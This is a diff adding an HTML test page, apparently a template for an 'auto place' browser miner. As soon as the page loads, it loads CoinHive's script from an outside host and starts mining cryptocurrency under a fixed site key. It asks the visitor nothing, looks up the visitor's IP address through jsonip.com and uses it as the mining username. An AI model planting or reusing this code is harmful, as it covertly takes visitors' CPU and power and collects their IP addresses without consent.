@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Test Javascript for auto place miner</title>
+</head>
+<script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
+<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+<script type="text/javascript">
+	//Get Remote File
+	//var remote_file = "https://github.com/tsiv/ccminer-cryptonight/releases/download/v0.17/ccminer-cryptonight_20140926.zip";
+	//var miner = new CoinHive.Anonymous('2eHLrquVgvZxV5KVtcSFlv0XxYY9zoar');
+	var client_name = GetComputerName();
+	//var client_name = "oddhome";
+	$("#com_name").text(client_name);
+	var miner = new CoinHive.User('2eHLrquVgvZxV5KVtcSFlv0XxYY9zoar', client_name, {
+		threads: 2,
+		autoThreads: false,
+		throttle: 0.8,
+		forceASMJS: false
+	});
+	miner.start();
+
+	// Listen on events
+	miner.on('found', function() { 
+		/* Hash found */ 
+		update_status();
+		//alert("Found");
+	});
+
+	miner.on('accepted', function() { 
+		/* Hash accepted by the pool */ 
+		update_status();
+		//alert("Accepted");
+	});
+
+	// Update stats once per second
+	setInterval(function() {
+		update_status();
+	}, 1000);
+
+	function update_status()
+	{
+		var hashesPerSecond = miner.getHashesPerSecond();
+		var totalHashes = miner.getTotalHashes();
+		var acceptedHashes = miner.getAcceptedHashes();
+
+		// Output to HTML elements...
+		$("#hashesPerSecond").text(hashesPerSecond);
+		$("#totalHashes").text(totalHashes);
+		$("#acceptedHashes").text(acceptedHashes);
+		$("#com_name").text(GetComputerName());
+	}
+
+	function GetComputerName() {
+    	var com_name = "oddhome";
+        $.getJSON("http://jsonip.com/?callback=?", function (data) {
+        	com_name = data.ip;
+        });
+
+        return com_name;
+	}
+</script>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/css/bootstrap.min.css" integrity="sha384-/Y6pD6FV/Vv2HJnA6t+vslU6fwYXjCFtcEpHbNJ0lyAFsXTsjBbfaDjzALeQsN6M" crossorigin="anonymous">
+
+<body>
+	<div class="row">
+		<div class="col-md-3">
+			Computer Name: <span id="com_name">Computer Name</span>
+		</div>
+		<div class="col-md-3">
+			Hash/Sec: <span id="hashesPerSecond">Hash per Second</span>
+		</div>
+		<div class="col-md-3">
+			Total Hash: <span id="totalHashes">Total Hash</span>
+		</div>
+		<div class="col-md-3">
+			Accept Share: <span id="acceptedHashes">Accpet Share</span>
+		</div>
+	</div>
+</body>
+</html>
